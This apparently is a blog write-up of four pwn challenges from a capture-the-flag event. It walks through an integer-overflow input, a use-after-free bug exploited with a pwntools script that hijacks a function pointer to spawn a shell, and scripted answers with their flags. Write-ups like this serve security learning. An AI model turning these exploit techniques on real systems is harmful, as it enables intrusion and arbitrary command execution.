---
layout: post
title:  "Pwn Challenges"
date:   2026-06-08 14:51:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /boroCTF-2026-pwn/
---
* TOC
{:toc}

## Coming Together

**Author**: Franklin

**Category**: Pwn

**Description**: You have yours and I have mine. Together we have something larger than ourselves. `nc oq7qaruz5vsw.boroctf.com 25287`

I get the challenge file:
```shell
file chal  
chal2: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=720e3e812e3843b12f8be56abdeb22b4e906c0d4, for GNU/Linux 3.2.0, not stripped
```

In ghidra I find this main function:
```shell
bool main(void)

{
  uint uVar1;
  FILE *__stream;
  long in_FS_OFFSET;
  int local_7c;
  char local_64 [12];
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("What number will you contribute?");
  fgets(local_64,0xc,stdin);
  local_7c = atoi(local_64);
  if (10000 < local_7c) {
    puts("Wow there, try not to out do my number too much.");
    local_7c = 1;
  }
  if (local_7c < 0) {
    puts("No negatives!");
    local_7c = -local_7c;
  }
  uVar1 = local_7c + 2;
  if (-1 < (int)uVar1) {
    printf("Our total is %d! Good work everyone!\n",(ulong)uVar1);
  }
  else {
    puts("Huh? That\'s not supposed to happen.");
    __stream = fopen("flag.txt","r");
    fgets(local_58,0x40,__stream);
    puts(local_58);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return -1 >= (int)uVar1;
}
```

To get the flag you need to trigger the `else` branch that reads and prints `flag.txt`. This happens when `(int)uVar1` is negative. By sending a negative number whose absolute value is large enough, you can make `uVar1` exceed `2^31-1` so that its signed interpretation becomes negative.

```shell
nc oq7qaruz5vsw.boroctf.com 25287  
What number will you contribute?  
-2147483648  
No negatives!  
Huh? That's not supposed to happen.  
boroCTF{tw0s_c0mpl3men+_M3}
```

`boroCTF{tw0s_c0mpl3men+_M3}`

___

## Next Challenge

**Author**: Franklin

**Category**: Pwn

**Description**: Psst...I've been hearing some rumors about this special command called nc. I don't know what it is so I have to assume it means Next Challenge ... right?? Maybe that MAN has more answers. `nc thww9zyp6ygt.boroctf.com 19350`

I just interacted with the server:
```shell
nc thww9zyp6ygt.boroctf.com 19350  
======================  
WELCOME TO VULNBOT!!!  
======================  
  
You will need to figure out how to exploit my expert design.  
  
help - list commands  
> help  
1. cheese  
2. flag  
> flag  
Are you SURE you don't want to see what the Cheese option does? (y/n)  
y  
FINE. I guess if you insist.  
boroCTF{0nLinE_C@ts*}
```

`boroCTF{0nLinE_C@ts*}`

___

## Mania

**Author**: Franklin

**Category**: Pwn

**Description**: Poor Joe has been doing binary exploitation challenges for too long and has gone mad. Can you help him re-adapt to society and have a real conversation? `nc 0agn86asl3d2.boroctf.com 44996`

I download the challenge files:
```shell
unzip Mania.zip  
Archive:  Mania.zip  
replace chal? [y]es, [n]o, [A]ll, [N]one, [r]ename: r  
new name: chal2  
replace chal2? [y]es, [n]o, [A]ll, [N]one, [r]ename: r  
new name: chal3  
  inflating: chal3  
  inflating: Dockerfile  
  inflating: friends.c  
  inflating: ld-linux-x86-64.so.2  
  inflating: libc.so.6  
 extracting: run.sh
```

Contents of `friends.c`:
```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define FRIENDSIZE 32
#define BUFFSIZE 32

struct __attribute__((packed)) imaginaryFriend {
    double rating;
    char title[FRIENDSIZE];
    char special_ability[FRIENDSIZE];
};

struct __attribute__((packed)) realPerson {
    char firstName[BUFFSIZE];
    char lastName[BUFFSIZE];
    void (*conversate)();
};

void menu();
struct imaginaryFriend *imagine();
struct realPerson *meet();
void realConversation();
void idealConversation();

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    puts("My conversations with my imaginary friends don't feel real anymore.");
    puts("Can you help me get out of my shell?");

    struct imaginaryFriend *IF = NULL;
    struct realPerson *RF = NULL;

    while (1) {
        char buf[BUFFSIZE];
        menu();
        fgets(buf, sizeof(buf), stdin);
        char choice = buf[0];

        switch (choice) {
            case '1':
                IF = imagine();
                break;
            case '2':
                free(IF);
                break;
            case '3':
                RF = meet();
                break;
            case '4':
                free(RF);
                break;
            case '5':
                if (RF != NULL) {
                    RF->conversate();
                } else {
                    puts("You haven't met anyone yet!");
                }
                break;
            default:
                puts("Unknown.");
                exit(1);
        }
    }
}

void menu() {
    puts("[1] - Imagine friend");
    puts("[2] - Forget friend");
    puts("[3] - Meet person");
    puts("[4] - Ghost person");
    puts("[5] - Interact");
    fputs("> ", stdout);
    fflush(stdout);
}

struct imaginaryFriend *imagine() {

    struct imaginaryFriend *friend = malloc(sizeof(struct imaginaryFriend));
    char buf[BUFFSIZE >> 1];

    puts("Enter title: ");
    fgets(friend->title, sizeof(friend->title), stdin);
    friend->title[strcspn(friend->title, "\r\n")] = 0;

    puts("Enter special ability: ");
    fgets(friend->special_ability, sizeof(friend->special_ability), stdin);
    friend->special_ability[strcspn(friend->special_ability, "\r\n")] = 0;

    puts("Enter rating: ");
    if (fgets(buf, sizeof(buf), stdin)) {
        friend->rating = strtod(buf, NULL);
    } else {
        friend->rating = 0.0;
    }

    printf("Imagined '%s' with ability '%s' (rating %.1f)!\n", friend->title, friend->special_ability, friend->rating);
    return friend;
}

struct realPerson *meet() {

    struct realPerson *friend = malloc(sizeof(struct realPerson));

    puts("Enter firstName: ");
    fgets(friend->firstName, sizeof(friend->firstName), stdin);
    friend->firstName[strcspn(friend->firstName, "\r\n")] = 0;

    puts("Enter lastName: ");
    fgets(friend->lastName, sizeof(friend->lastName), stdin);
    friend->lastName[strcspn(friend->lastName, "\r\n")] = 0;

    friend->conversate = realConversation;

    printf("Met '%s %s'!\n", friend->firstName, friend->lastName);
    return friend;
}

void realConversation() {
    puts("They brushed you off.");
}

void idealConversation() {
    puts("Wow! You made a real connection!");
    system("/bin/sh");
}
```

`struct realPerson` and `struct imaginaryFriend` are both 72 bytes so `malloc` reuses the same memory when freed and reallocated. 

After freeing `RF` (option 4) the pointer is not nulled. That means later calls to `RF->conversate` (option 5) trust that the pointer still points to a valid `realPerson`. 

The `conversate` function pointer lives at offset 64 inside `realPerson`. This overlaps the last 8 bytes of `special_ability` in `imaginaryFriend`. 

First you need to allocate a `realPerson` and free it so that `RF` still points there. Then allocate `imaginaryFriend` which reuses the same memory. We need the conversate pointer to become `idealConversation` which calls `system("/bin/sh")`. Fill the first 24 bytes with junk, then put the first 7 bytes of the little endian address of `idealConversation`. `Interact` calls `RF->conversate()` and since `RF` still points to the freed chunk now occupied by `imaginaryFriend`, the pointer jumps to `idealConversation` and spawns a shell.

Solve script:
```python
#!/usr/bin/env python3
from pwn import *

p = remote('0agn86asl3d2.boroctf.com', 44996)
elf = ELF('./chal3')
ideal_addr = elf.symbols['idealConversation']
log.info(f'idealConversation @ {hex(ideal_addr)}')

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'firstName: ', b'John')
p.sendlineafter(b'lastName: ', b'Doe')

p.sendlineafter(b'> ', b'4')

p.sendlineafter(b'> ', b'1')

payload = b'A' * 24
payload += p64(ideal_addr)[:7]

p.sendlineafter(b'Enter title: ', b'Dummy')
p.sendlineafter(b'Enter special ability: ', payload)
p.sendlineafter(b'Enter rating: ', b'5')

p.sendlineafter(b'> ', b'5')

p.interactive()
```

Output:
```shell
python3 solve2.py  
[+] Opening connection to 0agn86asl3d2.boroctf.com on port 44996: Done  
[*] '/home/user/Desktop/ctf/boroCTF2026/mania/chal3'  
	Arch:       amd64-64-little  
	RELRO:      Partial RELRO  
	Stack:      Canary found  
	NX:         NX enabled  
	PIE:        No PIE (0x400000)  
	SHSTK:      Enabled  
	IBT:        Enabled  
	Stripped:   No  
[*] idealConversation @ 0x401731  
[*] Switching to interactive mode  
Wow! You made a real connection!  
/bin/sh: 1: 5: not found  
$ ls  
chal  
flag.txt  
run  
$ cat flag.txt  
boroCTF{hYp0M&nic_3xplO1taTio4}$  
[*] Interrupted  
[*] Closed connection to 0agn86asl3d2.boroctf.com port 44996
```

`boroCTF{hYp0M&nic_3xplO1taTio4}`

___

## Fast Reactions

**Author**: Franklin

**Category**: Pwn

**Description**: Need higher WPM? Try monkeytype. `nc tnkemaq46125.boroctf.com 56354`

Connecting to the server:
```shell
nc tnkemaq46125.boroctf.com 56354  
Please enter 0x1f1 characters!  
idk  
Too short!  
Please enter 0x3b characters!  
^C
```

Run python to input the amount of characters it asks for automatically:
```shell
python3  
Python 3.13.5 (main, May  5 2026, 21:05:52) [GCC 14.2.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>>
... def main():  
...     host = "tnkemaq46125.boroctf.com"  
...     port = 56354  
...     conn = remote(host, port)  
...  
...     conn.recvuntil(b"Please enter ", timeout=2)  
...  
...     while True:  
...         # read the hex length  
...         hex_part = conn.recvuntil(b" characters!\n", timeout=2)  
...         if not hex_part:  
...             break  
...         print(f"[Server] Please enter {hex_part.decode().strip()}")  
...  
...         match = re.search(rb'0x[0-9a-fA-F]+', hex_part)  
...         if not match:  
...             remaining = conn.recvall(timeout=1)  
...             if remaining:  
...                 print(remaining.decode())  
...             break  
...  
...         length = int(match.group(0), 16)  
...         print(f"Sending {length} 'A's")  
...  
...         conn.send(b'A' * length + b'\n')  
...  
...         resp = conn.recvline(timeout=1)  
...         if not resp:  
...             break  
...         resp = resp.decode().strip()  
...         print(f"[Server] {resp}")  
...         if "boroCTF" in resp.lower():  
...             print("Flag: ")  
...             print(conn.recvall().decode())  
...             break  
...  
...     conn.close()  
...  
... if __name__ == "__main__":  
...     main()  
...  
[+] Opening connection to tnkemaq46125.boroctf.com on port 56354: Done  
[Server] Please enter 0x105 characters!  
Sending 261 'A's  
[Server] Nice job! Flag: boroCTF{Hum@n1y_im7o5s!ble}
```

`boroCTF{Hum@n1y_im7o5s!ble}`
